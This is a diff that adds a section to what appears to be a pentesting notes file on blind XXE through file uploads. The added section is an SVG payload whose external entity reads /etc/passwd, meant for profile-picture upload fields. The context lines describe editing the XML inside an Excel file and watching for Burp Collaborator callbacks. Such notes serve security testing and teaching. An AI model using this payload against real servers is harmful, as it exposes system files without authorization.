@@ -10,3 +10,9 @@ Is there any excel uploading function in website? Try these methods to find blin
  - zip back all the xml files using zip test.xlsx *
  - upload the files back to the server and see if the response come back to the burp collaborator
 ---
+### XXE in SVG file upload in profile picture like field
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
